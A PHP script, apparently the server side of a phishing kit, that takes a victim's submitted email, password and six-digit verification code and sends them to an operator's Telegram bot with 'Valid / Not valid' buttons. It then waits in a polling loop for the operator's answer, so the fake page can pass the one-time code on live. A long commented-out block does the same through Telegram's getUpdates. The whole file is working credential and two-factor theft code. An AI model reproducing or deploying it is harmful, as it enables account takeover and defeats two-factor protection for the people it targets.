<?php
    require 'tg.php';
	include("vendor/autoload.php");
    use Telegram\Bot\Api;

    $coood=$_POST['coood'];
    $email=$_POST['email'];
    $password=$_POST['password'];
    $chat_id=$_POST['chatid'];
	
	
	$keyboardz = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Валид', 'callback_data' => 'val2'],
            ['text' => '❌ Не валид', 'callback_data' => 'no2']
        ]
      ]
    ];
    $encodedKeyboardz = json_encode($keyboardz);

    $txt111='✅<b>Шестизначный код</b>✅%0A%0A<b>E-mail:</b>        '.$email.'%0A<b>Password:</b> '.$password.'%0A%0A<b>CODE:</b> '.$coood.'';

	fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt111}&reply_markup={$encodedKeyboardz}","r");
	// $today1 = date("U");
 //    $filenameq = './b/prov/'.$today1.$today1.'.txt';
 //    $per=''.$email777.' '.$pass777.' '.$updateId.'';
 //    file_put_contents($filenameq, $per);
 //    $today2 = date("His");

    $s_1 = './shagi/four/nach.txt';
    while(true)
    {
        $shag_1=file_get_contents($s_1);
        if($shag_1=='1')
        {
            file_put_contents($s_1, '');
            $exittt=1;
            exit(print $exittt);
            break;
        }
        elseif($shag_1=='2')
        {
            file_put_contents($s_1, '');
            $exittt=2;
            exit(print $exittt);
            break;
        }
    }
	












	// while (true)
 //    {
 //        $url1= 'https://api.telegram.org/bot'.$token.'/getUpdates';
 //        $update1 = file_get_contents($url1);
 //        $arrayUpdate1= json_decode($update1, true);

 //        if (!empty($arrayUpdate1['result']))
 //        {
 //            foreach ($arrayUpdate1['result'] as $arrayUpdate1)
 //            {
 //                if (array_key_exists('update_id',$arrayUpdate1))
 //                {

 //                    $us1 = $arrayUpdate1['callback_query']['from']['id'];
 //                    $userId1 = $arrayUpdate1['update_id'];
                    
 //                }
 //            }

 //            $str1="".$userId1.$today2."";
 //            $filename1 = "./b/f/".$str1.".txt";
 //            file_put_contents($filename1, $userId1);
 //            $text200 = file_get_contents($filename1);
 //        }

 //        while (true)
 //        {   
            
 //            $url= 'https://api.telegram.org/bot'.$token.'/getUpdates';
 //            try
 //            {

 //                $update1 = file_get_contents($url);

 //                if (!$update1)
 //                {
 //                    throw new Exception('Not found');
 //                }

 //                else
 //                {
 //                    $arrayUpdate1= json_decode($update1, true);
 //                }

 //            }
 //            catch(Exception $e)
 //            {
 //                $dfdfdsdsfdsfsdf=1;
 //            }

            
            



            
 //            $url1= 'https://api.telegram.org/bot'.$token.'/getUpdates';
 //            $update1 = file_get_contents($url1);
 //            $arrayUpdate1= json_decode($update1, true);
 //            if (!empty($arrayUpdate1['result']))
 //            { 
 //                foreach ($arrayUpdate1['result'] as $arrayUpdate1)
 //                {
 //                    if (array_key_exists('callback_query',$arrayUpdate1))
 //                    {
 //                        $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
 //                        $userId1 = $arrayUpdate1['callback_query']['from']['id'];
 //                        $textid1=$arrayUpdate1['callback_query']['message']['text'];
 //                        $updateId1 = $arrayUpdate1['update_id'];
 //                        $textid1 = str_replace(' ', '', $textid1);
 //                        $textid1 = explode("\n", $textid1);
 //                        $email1=substr($textid1[2],7);
 //                        $password1=substr($textid1[3],9);
 //                        $ID1=substr($textid1[5],3);
 //                    }
 //                }
                
                
 //                $str2="".$userId1.$today2."";
 //                $filename2 = "./b/f/".$str2.".txt";
 //                file_put_contents($filename2, $updateId1);
 //                $text201 = file_get_contents($filename2);

 //                if (($email1==$email777)&&($password1==$pass777))
 //                {
                   
 //                    $files = file_get_contents('./b/prov/'.$today1.$today1.'.txt');
 //                    $files = explode(" ", $files);
 //                    $em=$files[0];
 //                    $pass=$files[1];
 //                    $ID=$files[2];
                    
 //                    if (($email1==$em)&&($password1==$pass)&&($ID=$ID1))
 //                    {

 //                        if ($text200<$text201)
 //                        {
                            
 //                            break;
 //                        }
 //                    }
 //                }
 //            }
 //        }
        
 //        if ($arrayUpdate1['callback_query']['data'] == 1)
 //        {
 //            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
 //            $zar=$arrayUpdate1['callback_query']['from']['username'];
 //            $text111=$txt111.'%0A✅ Валид';

 //            try
 //            {

 //                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$chat_id}&message_id={$messid1}&parse_mode=html&text={$text111}","r");
                
 //                if (!$nof)
 //                {
 //                    throw new Exception('Not found');
 //                }
                
 //                else
 //                {
 //                    exit(print '3');
 //                    break;  
 //                }
 //            }
 //            catch(Exception $e)
 //            {
 //                $uu=1;             
 //            }     
 //        }
 //        else if ($arrayUpdate1['callback_query']['data'] == 2)
 //        {
 //            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
 //            $zar=$arrayUpdate1['callback_query']['from']['username'];
 //            $text111=$txt111.'%0A❌ Не валид';

 //            try
 //            {

 //                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$chat_id}&message_id={$messid1}&parse_mode=html&text={$text111}","r");
                
 //                if (!$nof)
 //                {
 //                    throw new Exception('Not found');
 //                }
                
 //                else
 //                {
 //                    exit(print '1');
 //                    break;  
 //                }
 //            }
 //            catch(Exception $e)
 //            {
 //                $uu=1;             
 //            }
 //        }
 //        else
 //        {
 //        	$bbb=0;
 //        } 
 //    }